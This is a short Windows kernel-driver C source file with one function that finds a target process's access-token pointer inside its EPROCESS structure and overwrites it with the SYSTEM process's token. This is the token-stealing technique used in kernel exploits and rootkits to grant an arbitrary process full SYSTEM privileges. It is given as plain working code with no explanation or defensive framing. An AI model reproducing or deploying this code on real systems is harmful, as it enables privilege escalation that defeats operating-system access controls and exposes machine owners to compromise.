#include <ntifs.h>
#include <ntddk.h>

void ReplaceToken(PEPROCESS Process, PACCESS_TOKEN Token) {
	PACCESS_TOKEN SystemToken;
	PULONG ptr;

	SystemToken = PsReferencePrimaryToken(PsInitialSystemProcess);
	ptr = (PULONG)Process;

	ULONG i;
	for (i = 0; i < 512; i++)
	{
		if ((ptr[i] & ~7) == (ULONG)((ULONG)Token & ~7))
		{
			ptr[i] = (ULONG)SystemToken; // Replace the orginal token with system token.
			break;
		}
	}

	ObfDereferenceObject(SystemToken);
}